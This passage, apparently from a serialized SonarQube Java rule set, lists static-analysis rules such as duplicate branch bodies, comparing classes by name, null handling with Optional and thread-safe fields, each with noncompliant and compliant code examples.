  } else {
    printf("i is %d", i);
    return;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf("i is %d", i);
}
...
for (int i = 0; i &lt; 10; i++) {
  if(i == x) {
    break;
  } else {
    printf("i is %d", i);
  }
}
</pre>ZBUG
∂

java:S1871ß
javaS1871WTwo branches in a conditional structure should not have exactly the same implementation"MAJOR*java:•<p>Having two <code>cases</code> in a <code>switch</code> statement or two branches in an <code>if</code> chain with the same implementation is at
best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then in an <code>if</code> chain they should
be combined, or for a <code>switch</code>, one should fall through to the other. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (i) {
  case 1:
    doFirstThing();
    doSomething();
    break;
  case 2:
    doSomethingDifferent();
    break;
  case 3:  // Noncompliant; duplicates case 1's implementation
    doFirstThing();
    doSomething();
    break;
  default:
    doTheRest();
}

if (a &gt;= 0 &amp;&amp; a &lt; 10) {
  doFirstThing();
  doTheThing();
}
else if (a &gt;= 10 &amp;&amp; a &lt; 20) {
  doTheOtherThing();
}
else if (a &gt;= 20 &amp;&amp; a &lt; 50) {
  doFirstThing();
  doTheThing();  // Noncompliant; duplicates first condition
}
else {
  doTheRest();
}
</pre>
<h2>Exceptions</h2>
<p>Blocks in an <code>if</code> chain that contain a single line of code are ignored, as are blocks in a <code>switch</code> statement that contain a
single line of code with or without a following <code>break</code>.</p>
<pre>
if(a == 1) {
  doSomething();  //no issue, usually this is done on purpose to increase the readability
} else if (a == 2) {
  doSomethingElse();
} else {
  doSomething();
}
</pre>
<p>But this exception does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without default clauses when
all branches have the same single line of code. In case of <code>if</code> chains with <code>else</code>-s, or of <code>switch</code>-es with default
clauses, rule <a href='/coding_rules#rule_key=squid%3AS3923'>S3923</a> raises a bug. </p>
<pre>
if(a == 1) {
  doSomething();  //Noncompliant, this might have been done on purpose but probably not
} else if (a == 2) {
  doSomething();
}
</pre>Z
CODE_SMELL
Î

java:S1872‹
javaS1872&Classes should not be compared by name"MAJOR*java:í<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an object's type based
on its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted
class and thereby gain trusted access.</p>
<p>Instead, the <code>instanceof</code> operator or the <code>Class.isAssignableFrom()</code> method should be used to check the object's underlying
type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
package computer;
class Pear extends Laptop { ... }

package food;
class Pear extends Fruit { ... }

class Store {

  public boolean hasSellByDate(Object item) {
    if ("Pear".equals(item.getClass().getSimpleName())) {  // Noncompliant
      return true;  // Results in throwing away week-old computers
    }
    return false;
  }

  public boolean isList(Class&lt;T&gt; valueClass) {
    if (List.class.getName().equals(valueClass.getName())) {  // Noncompliant
      return true;
    }
    return false;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class Store {

  public boolean hasSellByDate(Object item) {
    if (item instanceof food.Pear) {
      return true;
    }
    return false;
  }

  public boolean isList(Class&lt;T&gt; valueClass) {
    if (valueClass.isAssignableFrom(List.class)) {
      return true;
    }
    return false;
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/486.html">MITRE, CWE-486</a> - Comparison of Classes by Name </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/LAFlAQ">CERT, OBJ09-J.</a> - Compare classes and not class names </li>
</ul>ZBUG
∑

java:S1996®
javaS1996?Files should contain only one top-level class or interface each"MAJOR*java:æ<p>A file that grows too much tends to aggregate too many responsibilities and inevitably becomes harder to understand and therefore to maintain. This
is doubly true for a file with multiple top-level classes and interfaces. It is strongly advised to divide the file into one top-level class or
interface per file.</p>Z
CODE_SMELL
ø

java:S2973∞
javaS2973-Escaped Unicode characters should not be used"MAJOR*java:ÿ<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>
<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a
printable character.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String prefix = "n\u00E9e"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
String prefix = "n√©e";
</pre>Z
CODE_SMELL
‡

java:S1764—
javaS1764KIdentical expressions should not be used on both sides of a binary operator"MAJOR*java:‚<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste
error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical
operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ( a == a ) { // always true
  doZ();
}
if ( a != a ) { // always false
  doY();
}
if ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too
  doX();
}
if ( a == b || a == b ) { // if the first one is true, the second one is too
  doW();
}

int j = 5 / 5; //always 1
int k = 5 - 5; //always 0

c.equals(c); //always true
</pre>
<h2>Exceptions</h2>
<ul>
  <li> This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </li>
  <li> The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored. </li>
  <li> Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored. </li>
</ul>
<pre>
float f;
if(f != f) { //test for NaN value
  System.out.println("f is NaN");
}

int i = 1 &lt;&lt; 1; // Compliant
int j = a &lt;&lt; a; // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
  <li> <a href='/coding_rules#rule_key=squid%3AS1656'>S1656</a> - Implements a check on <code>=</code>. </li>
</ul>ZBUG
∂

java:S2972ß
javaS29724Inner classes should not have too many lines of code"MAJOR*java:»<p>Inner classes should be short and sweet, to manage complexity in the overall file. An inner class that has grown longer than a certain threshold
should probably be externalized to its own file.</p>Z
CODE_SMELL
œ

java:S3824¿
javaS3824C"Map.get" and value test should be replaced with single method call"MAJOR*java:“<p>It's a common pattern to test the result of a <code>java.util.Map.get()</code> against <code>null</code> before proceeding with adding or changing
the value in the map. However the <code>java.util.Map</code> API offers a significantly better alternative in the form of the
<code>computeIfPresent()</code> and <code>computeIfAbsent()</code> methods. Using these instead leads to cleaner and more readable code.</p>
<p><strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is not 8.</p>
<h2>Noncompliant Code Example</h2>
<pre>
V value = map.get(key);
if (value == null) {  // Noncompliant
  value = V.createFor(key);
  if (value != null) {
    map.put(key, value);
  }
}
return value;
</pre>
<h2>Compliant Solution</h2>
<pre>
return map.computeIfAbsent(key, k -&gt; V.createFor(k));
</pre>Z
CODE_SMELL
π

java:S1697™
javaS1697WShort-circuit logic should be used to prevent null pointer dereferences in conditionals"MAJOR*java:Ø<p>When either the equality operator in a null test or the logical operator that follows it is reversed, the code has the appearance of safely
null-testing the object before dereferencing it. Unfortunately the effect is just the opposite - the object is null-tested and then dereferenced
<em>only</em> if it is null, leading to a guaranteed null pointer dereference.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (str == null &amp;&amp; str.length() == 0) {
  System.out.println("String is empty");
}

if (str != null || str.length() &gt; 0) {
  System.out.println("String is not empty");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (str == null || str.length() == 0) {
  System.out.println("String is empty");
}

if (str != null &amp;&amp; str.length() &gt; 0) {
  System.out.println("String is not empty");
}
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=squid%3AS2259'>S2259</a> instead.</p>ZBUG
Æ	

java:S1696ü	
javaS1696+"NullPointerException" should not be caught"MAJOR*java:…<p><code>NullPointerException</code> should be avoided, not caught. Any situation in which <code>NullPointerException</code> is explicitly caught can
easily be converted to a <code>null</code> test, and any behavior being carried out in the catch block can easily be moved to the "is null" branch of
the conditional.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int lengthPlus(String str) {
  int len = 2;
  try {
    len += str.length();
  }
  catch (NullPointerException e) {
    log.info("argument was null");
  }
  return len;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public int lengthPlus(String str) {
  int len = 2;

  if (str != null) {
    len += str.length();
  }
  else {
    log.info("argument was null");
  }
  return len;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/395.html">MITRE, CWE-395</a> - Use of NullPointerException Catch to Detect NULL Pointer
  Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/BIB3AQ">CERT, ERR08-J.</a> - Do not catch NullPointerException or any of its ancestors
  </li>
</ul>Z
CODE_SMELL
”

java:S3631ƒ
javaS36313"Arrays.stream" should be used for primitive arrays"MAJOR*java:Ê<p>For arrays of objects, <code>Arrays.asList(T ... a).stream()</code> and <code>Arrays.stream(array)</code> are basically equivalent in terms of
performance. However, for arrays of primitives, using <code>Arrays.asList</code> will force the construction of a list of boxed types, and then use
<em>that</em> list as a stream. On the other hand, <code>Arrays.stream</code> uses the appropriate primitive stream type (<code>IntStream</code>,
<code>LongStream</code>, <code>DoubleStream</code>) when applicable, with much better performance.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Arrays.asList("a1", "a2", "b1", "c2", "c1").stream()
    .filter(...)
    .forEach(...);

Arrays.asList(1, 2, 3, 4).stream() // Noncompliant
    .filter(...)
    .forEach(...);
</pre>
<h2>Compliant Solution</h2>
<pre>
Arrays.asList("a1", "a2", "b1", "c2", "c1").stream()
    .filter(...)
    .forEach(...);

int[] intArray = new int[]{1, 2, 3, 4};
Arrays.stream(intArray)
    .filter(...)
    .forEach(...);
</pre>Z
CODE_SMELL
“	

java:S2301√	
javaS23014Public methods should not contain selector arguments"MAJOR*java:‰<p>A selector argument is a <code>boolean</code> argument that's used to determine which of two paths to take through a method. Specifying such a
parameter may seem innocuous, particularly if it's well named. </p>
<p>Unfortunately, the maintainers of the code calling the method won't see the parameter name, only its value. They'll be forced either to guess at
the meaning or to take extra time to look the method up.</p>
<p>Instead, separate methods should be written.</p>
<p>This rule finds methods with a <code>boolean</code> that's used to determine which path to take through the method.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public String tempt(String name, boolean ofAge) {
  if (ofAge) {
    offerLiquor(name);
  } else {
    offerCandy(name);
  }
}

// ...
public void corrupt() {
  tempt("Joe", false); // does this mean not to temp Joe?
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void temptAdult(String name) {
  offerLiquor(name);
}

public void temptChild(String name) {
    offerCandy(name);
}

// ...
public void corrupt() {
  age &lt; legalAge ? temptChild("Joe") : temptAdult("Joe");
}
</pre>Z
CODE_SMELL
ä

java:S1695˚
javaS16956"NullPointerException" should not be explicitly thrown"MAJOR*java:ö<p>A <code>NullPointerException</code> should indicate that a <code>null</code> value was unexpectedly encountered. Good programming practice dictates
that code is structured to avoid NPE's. </p>
<p>Explicitly throwing <code>NullPointerException</code> forces a method's callers to explicitly catch it, rather than coding to avoid it. Further, it
makes it difficult to distinguish between the unexpectedly-encountered <code>null</code> value and the condition which causes the method to purposely
throw an NPE.</p>
<p>If an NPE is being thrown to indicate that a parameter to the method should not have been null, use the <code>@NotNull</code> annotation
instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething (String aString) throws NullPointerException {
     throw new NullPointerException();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething (@NotNull String aString) {
}
</pre>Z
CODE_SMELL
˚

java:S3750Ï
javaS37504Spring "@Controller" classes should not use "@Scope""MAJOR*java:î<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s have <code>singleton</code> scope by default, meaning only
one instance of the class is ever instantiated in the application. Defining any other scope for one of these class types will result in needless churn
as new instances are created and destroyed. In a busy web application, this could cause a significant amount of needless additional load on the
server.</p>
<p>This rule raises an issue when the <code>@Scope</code> annotation is applied to a <code>@Controller</code>, <code>@Service</code>, or
<code>@Repository</code> with any value but "singleton". <code>@Scope("singleton")</code> is redundant, but ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Scope("prototype")  // Noncompliant
@Controller
public class HelloWorld {
</pre>
<h2>Compliant Solution</h2>
<pre>
@Controller
public class HelloWorld {
</pre>ZBUG
ß

java:S2308ò
javaS2308!"deleteOnExit" should not be used"MAJOR*java:Ã<p>Use of <code>File.deleteOnExit()</code> is not recommended for the following reasons:</p>
<ul>
  <li> The deletion occurs only in the case of a normal JVM shutdown but not when the JVM crashes or is killed. </li>
  <li> For each file handler, the memory associated with the handler is released only at the end of the process. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
File file = new File("file.txt");
file.deleteOnExit();  // Noncompliant
</pre>Z
CODE_SMELL
ø

java:S4604∞
javaS4604/"@EnableAutoConfiguration" should be fine-tuned"MAJOR*java:÷<p>"@EnableAutoConfiguration" is a convenient feature to configure the Spring Application Context by attempting to guess the beans that you are likely
to need. The drawback is that it may load and configure beans the application will never use and therefore consume more CPU and RAM than really
required. <code>@EnableAutoConfiguration</code> should be configured to exclude all the beans not required by the application. Alternatively, use the
<code>@Import</code> annotation instead of <code>@EnableAutoConfiguration</code>, to explicitly import the useful AutoConfiguration classes.</p>
<p>This rule applies for <code>@SpringBootApplication</code> as well.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@SpringBootApplication
public class MyApplication {
...
}
</pre>
<pre>
@Configuration
@EnableAutoConfiguration
public class MyApplication {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@SpringBootApplication(exclude = {
  MultipartAutoConfiguration.class,
  JmxAutoConfiguration.class,
})
public class MyApplication {
...
}
</pre>
<pre>
@Configuration
@EnableAutoConfiguration(exclude = {
  MultipartAutoConfiguration.class,
  JmxAutoConfiguration.class,
})
public class MyApplication {
...
}
</pre>
<pre>
@Configuration
@Import({
        DispatcherServletAutoConfiguration.class,
        EmbeddedServletContainerAutoConfiguration.class,
        ErrorMvcAutoConfiguration.class,
        HttpEncodingAutoConfiguration.class,
        HttpMessageConvertersAutoConfiguration.class,
        JacksonAutoConfiguration.class,
        ServerPropertiesAutoConfiguration.class,
        PropertyPlaceholderAutoConfiguration.class,
        ThymeleafAutoConfiguration.class,
        WebMvcAutoConfiguration.class
})
public class MyApplication {
...
}
</pre>Z
CODE_SMELL
Ò

java:S4603‚
javaS46033"@Import"s should be preferred to "@ComponentScan"s"MAJOR*java:Ñ<p><code>@ComponentScan</code> is used to find which Spring <code>@Component</code> beans (<code>@Service</code> or <code>@Repository</code> or
<code>Controller</code>) are available in the classpath so they can be used in the application context. This is a convenient feature especially when
you begin a new project but it comes with the drawback of slowing down the application start-up time especially when the application becomes bigger
(ie: it references a large JAR file, or it references a significant number of JAR files, or the base-package refers to a large amount of .class
files).</p>
<p><code>@ComponentScan</code> should be replaced by an explicit list of Spring beans loaded by <code>@Import</code>.</p>
<p>The interface <code>@SpringBootApplication</code> is also considered by this rule because it is annotated with <code>@ComponentScan</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@ComponentScan
public class MyApplication {
...
}

@SpringBootApplication
public class MyApplication {
...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
@Configuration
@Import({
        DispatcherServletAutoConfiguration.class,
        ErrorMvcAutoConfiguration.class,
        HttpEncodingAutoConfiguration.class,
        HttpMessageConvertersAutoConfiguration.class,
        MultipartAutoConfiguration.class,
        ServerPropertiesAutoConfiguration.class,
        PropertyPlaceholderAutoConfiguration.class,
        WebMvcAutoConfiguration.class
})
public class MyApplication {
...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cloud.google.com/appengine/articles/spring_optimization">Optimizing Spring Framework for App Engine Applications</a> </li>
</ul>Z
CODE_SMELL
ò

java:S1217â
javaS1217,"Thread.run()" should not be called directly"MAJOR*java:π<p>The purpose of the <code>Thread.run()</code> method is to execute code in a separate, dedicated thread. Calling this method directly doesn't make
sense because it causes its code to be executed in the current thread. </p>
<p>To get the expected behavior, call the <code>Thread.start()</code> method instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.run(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Thread myThread = new Thread(runnable);
myThread.start(); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/572.html">MITRE, CWE-572</a> - Call to Thread run() instead of start() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/KQAiAg">CERT THI00-J.</a> - Do not invoke Thread.run() </li>
</ul>ZBUG
—

java:S2789¬
javaS2789)"null" should not be used with "Optional""MAJOR*java:ı<p>The concept of <code>Optional</code> is that it will be used when <code>null</code> could cause errors. In a way, it replaces <code>null</code>,
and when <code>Optional</code> is in use, there should never be a question of returning or receiving <code>null</code> from a call.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething () {
  Optional&lt;String&gt; optional = getOptional();
  if (optional != null) {  // Noncompliant
    // do something with optional...
  }
}

@Nullable // Noncompliant
public Optional&lt;String&gt; getOptional() {
  // ...
  return null;  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething () {
  Optional&lt;String&gt; optional = getOptional();
  optional.ifPresent(
    // do something with optional...
  );
}

public Optional&lt;String&gt; getOptional() {
  // ...
  return Optional.empty();
}
</pre>ZBUG
ç	

java:S2677˛
javaS26772"read" and "readLine" return values should be used"MAJOR*java:®<p>When a method is called that returns data read from some data source, that data should be stored rather than thrown away. Any other course of
action is surely a bug.</p>
<p>This rule raises an issue when the return value of any of the following is ignored or merely null-checked: <code>BufferedReader.readLine()</code>,
<code>Reader.read()</code>, and these methods in any child classes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomethingWithFile(String fileName) {
  BufferedReader buffReader = null;
  try {
    buffReader = new BufferedReader(new FileReader(fileName));
    while (buffReader.readLine() != null) { // Noncompliant
      // ...
    }
  } catch (IOException e) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomethingWithFile(String fileName) {
  BufferedReader buffReader = null;
  try {
    buffReader = new BufferedReader(new FileReader(fileName));
    String line = null;
    while ((line = buffReader.readLine()) != null) {
      // ...
    }
  } catch (IOException e) {
    // ...
  }
}
</pre>ZBUG
≠

java:S4973û
javaS4973;Strings and Boxed types should be compared using "equals()""MAJOR*java:ø
<p>It's almost always a mistake to compare two instances of <code>java.lang.String</code> or boxed types like <code>java.lang.Integer</code> using
reference equality <code>==</code> or <code>!=</code>, because it is not comparing actual value but locations in memory.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String firstName = getFirstName(); // String overrides equals
String lastName = getLastName();

if (firstName == lastName) { ... }; // Non-compliant; false even if the strings have the same value
</pre>
<h2>Compliant Solution</h2>
<pre>
String firstName = getFirstName();
String lastName = getLastName();

if (firstName != null &amp;&amp; firstName.equals(lastName)) { ... };
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/595.html">MITRE, CWE-595</a> - Comparison of Object References Instead of Object Contents </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/597.html">MITRE, CWE-597</a> - Use of Wrong Operator in String Comparison </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wwD1AQ">CERT, EXP03-J.</a> - Do not use the equality operators when comparing values of
  boxed primitives </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/8AEqAQ">CERT, EXP50-J.</a> - Do not confuse abstract object equality with reference
  equality </li>
</ul>ZBUG
Í

java:S1223€
javaS1223LNon-constructor methods should not have the same name as the enclosing class"MAJOR*java:‰<p>Having a class and some of its methods sharing the same name is misleading, and leaves others to wonder whether it was done that way on purpose, or
was the methods supposed to be a constructor.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo {
   public Foo() {...}
   public void Foo(String label) {...}  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Foo {
   public Foo() {...}
   public void foo(String label) {...}  // Compliant
}
</pre>Z
CODE_SMELL
¢

java:S2675ì
javaS2675)"readObject" should not be "synchronized""MAJOR*java:ø<p>A <code>readObject</code> method is written when a <code>Serializable</code> object needs special handling to be rehydrated from file. It should be
the case that the object being created by <code>readObject</code> is only visible to the thread that invoked the method, and the
<code>synchronized</code> keyword is not needed, and using <code>synchronized</code> anyway is just confusing. If this is not the case, the method
should be refactored to make it the case.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private synchronized void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException { // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private void readObject(java.io.ObjectInputStream in)
     throws IOException, ClassNotFoundException { // Compliant
  //...
}
</pre>Z
CODE_SMELL
Õ

java:S1221æ
javaS1221=Methods should not be named "tostring", "hashcode" or "equal""MAJOR*java:›<p>Naming a method <code>tostring</code>, <code>hashcode()</code> or <code>equal</code> is either:</p>
<ul>
  <li> A bug in the form of a typo. Overriding <code>toString</code>, <code>Object.hashCode()</code> (note the camelCasing) or
  <code>Object.equals</code> (note the 's' on the end) was meant, and the application does not behave as expected. </li>
  <li> Done on purpose. The name however will confuse every other developer, who may not notice the naming difference, or who will think it is a bug.
  </li>
</ul>
<p>In both cases, the method should be renamed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public int hashcode() { /* ... */ }  // Noncompliant

public String tostring() { /* ... */ } // Noncompliant

public boolean equal(Object obj) { /* ... */ }  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
@Override
public int hashCode() { /* ... */ }

@Override
public String toString() { /* ... */ }

@Override
public boolean equals(Object obj) { /* ... */ }
</pre>ZBUG
Ó

java:S2438ﬂ
javaS2438;"Threads" should not be used where "Runnables" are expected"MAJOR*java:˘<p>While it is technically correct to use a <code>Thread</code> where a <code>Runnable</code> is called for, the semantics of the two objects are
different, and mixing them is a bad practice that will likely lead to headaches in the future.</p>
<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> is an object whose
running should be managed. A <code>Thread</code> expects to manage the running of itself or other <code>Runnables</code>. </p>
<h2>Noncompliant Code Example</h2>
<pre>
	public static void main(String[] args) {
		Thread r =new Thread() {
			int p;
			@Override
			public void run() {
				while(true)
					System.out.println("a");
			}
		};
		new Thread(r).start();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
	public static void main(String[] args) {
		Runnable r =new Runnable() {
			int p;
			@Override
			public void run() {
				while(true)
					System.out.println("a");
			}
		};
		new Thread(r).start();
</pre>Z
CODE_SMELL
–

java:S4738¡
javaS4738,Java 8 features should be preferred to Guava"MAJOR*java:Í<p>Some Guava features were really useful for Java 7 application because Guava was bringing APIs missing in the JDK. Java 8 fixed these limitations.
When migrating an application to Java 8 or even when starting a new one, it's recommended to prefer Java 8 APIs over Guava ones to ease its
maintenance: developers don't need to learn how to use two APIs and can stick to the standard one.</p>
<p>This rule raises an issue when the following Guava APIs are used:</p>
<table>
  <tbody>
    <tr>
      <th> Guava API </th>
      <th> Java 8 API </th>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.io.BaseEncoding#base64Url() </td>
      <td> java.util.Base64 </td>
    </tr>
    <tr>
      <td> com.google.common.base.Joiner.on() </td>
      <td> java.lang.String#join() or java.util.stream.Collectors#joining() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#of() </td>
      <td> java.util.Optional#of() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#absent() </td>
      <td> java.util.Optional#empty() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional#fromNullable() </td>
      <td> java.util.Optional#ofNullable() </td>
    </tr>
    <tr>
      <td> com.google.common.base.Optional </td>
      <td> java.util.Optional </td>
    </tr>
    <tr>
      <td> com.google.common.base.Predicate </td>
      <td> java.util.function.Predicate </td>
    </tr>
    <tr>
      <td> com.google.common.base.Function </td>
      <td> java.util.function.Function </td>
    </tr>
    <tr>
      <td> com.google.common.base.Supplier </td>
      <td> java.util.function.Supplier </td>
    </tr>
  </tbody>
</table>Z
CODE_SMELL
£

java:S2885î
javaS2885+Non-thread-safe fields should not be static"MAJOR*java:≈<p>Not all classes in the standard Java library were written to be thread-safe. Using them in a multi-threaded manner is highly likely to cause data
problems or exceptions at runtime.</p>
<p>This rule raises an issue when an instance of <code>Calendar</code>, <code>DateFormat</code>, <code>javax.xml.xpath.XPath</code>, or
<code>javax.xml.validation.SchemaFactory</code> is marked <code>static</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {
  private static SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");  // Noncompliant
  private static Calendar calendar = Calendar.getInstance();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
public class MyClass {
  private SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");
  private Calendar calendar = Calendar.getInstance();
</pre>ZBUG
‘

java:S2886≈
javaS28863Getters and setters should be synchronized in pairs"MAJOR*java:Ó
<p>When one part of a getter/setter pair is <code>synchronized</code> the other part should be too. Failure to synchronize both sides of a pair may
result in inconsistent behavior at runtime as callers access an inconsistent method state.</p>
<p>This rule raises an issue when either the method or the contents of one method in a getter/setter pair are synchrnoized but the other is not.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Person {
  String name;
  int age;

  public synchronized void setName(String name) {
    this.name = name;
  }

  public String getName() {  // Noncompliant
    return this.name;
  }

  public void setAge(int age) {  // Noncompliant
    this.age = age;
  }

  public int getAge() {
    synchronized (this) {
      return this.age;
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Person {
  String name;
  int age;

  public synchronized void setName(String name) {
    this.name = name;
  }

  public synchronized String getName() {
    return this.name;
  }

  public void setAge(int age) {
    synchronized (this) {
      this.age = age;
   }
  }

  public int getAge() {
    synchronized (this) {
      return this.age;
    }
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/I4BoAg">CERT, VNA01-J.</a> - Ensure visibility of shared references to immutable
  objects </li>
</ul>ZBUG
˚

java:S2761Ï
javaS2761-Unary prefix operators should not be repeated"MAJOR*java:õ<p>The needless repetition of an operator is usually a typo. There is no reason to write <code>!!!i</code> when <code>!i</code> will do.</p>
<p>On the other hand, the repetition of increment and decrement operators may have been done on purpose, but doing so obfuscates the meaning, and
should be simplified.</p>
<p>This rule raises an issue for sequences of: <code>!</code>, <code>~</code>, <code>-</code>, and <code>+</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 1;

int j = - - -i;  // Noncompliant; just use -i
int k = ~~~i;    // Noncompliant; same as i
int m = + +i;    // Noncompliant; operators are useless here

boolean b = false;
boolean c = !!!b;   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
int i =  1;

int j = -i;
int k = ~i;
int m =  i;

boolean b = false;
boolean c = !b;
</pre>
<h2>Exceptions</h2>
<p>Overflow handling for GWT compilation using <code>~~</code> is ignored.</p>ZBUG
·

java:S1317“
javaS1317N"StringBuilder" and "StringBuffer" should not be instantiated with a character"MAJOR*java:‡<p>Instantiating a <code>StringBuilder</code> or a <code>StringBuffer</code> with a character is misleading because most Java developers would expect
the character to be the initial value of the <code>StringBuffer</code>. </p>
<p>What actually happens is that the int representation of the character is used to determine the initial size of the <code>StringBuffer</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
StringBuffer foo = new StringBuffer('x');   //equivalent to StringBuffer foo = new StringBuffer(120);
</pre>
<h2>Compliant Solution</h2>
<pre>
StringBuffer foo = new StringBuffer("x");
</pre>ZBUG
Ç

java:S3864Û
javaS3864)"Stream.peek" should be used with caution"MAJOR*java:ü<p>According to its JavaDocs, <code>java.util.Stream.peek()</code> ‚Äúexists mainly to support debugging‚Äù purposes. Although this does not mean that
using it for other purposes is discouraged, relying on <code>peek()</code> without careful consideration can lead to error-prone code such as:</p>
<ul>
  <li> If the stream pipeline does not include a terminal operation, no elements will be consumed and the <code>peek()</code> action will not be
  invoked at all. </li>
  <li> As long as a stream implementation can reach the final step, it can freely optimize processing by only producing some elements or even none at
  all (e.g. relying on other collection methods for counting elements). Accordingly, the <code>peek()</code> action will be invoked for fewer elements
  or not at all. </li>
</ul>
<p>This rule raises an issue for each use of <code>peek()</code> to be sure that it is challenged and validated by the team to be meant for production
debugging/logging purposes.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Stream.of("one", "two", "three", "four")
         .filter(e -&gt; e.length() &gt; 3)
         .peek(e -&gt; System.out.println("Filtered value: " + e)); // Noncompliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html#peek-java.util.function.Consumer-">Java 8 API Documentation</a>
  </li>
  <li> 4comprehension: <a href="https://4comprehension.com/idiomatic-peeking/">Idiomatic Peeking with Java Stream API</a> </li>
  <li> Data Geekery: <a href="https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/">10 Subtle Mistakes When
  Using the Streams API</a> </li>
</ul>Z
CODE_SMELL
Ç

java:S3985Û
javaS3985*Unused "private" classes should be removed"MAJOR*java:û<p><code>private</code> classes that are never used are dead code: unnecessary, inoperative code that should be removed. Cleaning out dead code
decreases the size of the maintained codebase, making it easier to understand the program and preventing bugs from being introduced.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Foo
{
  ...
  private class MyUnusedPrivateClass {...} // Noncompliant
}
</pre>Z
CODE_SMELL
ï

java:S3986Ü
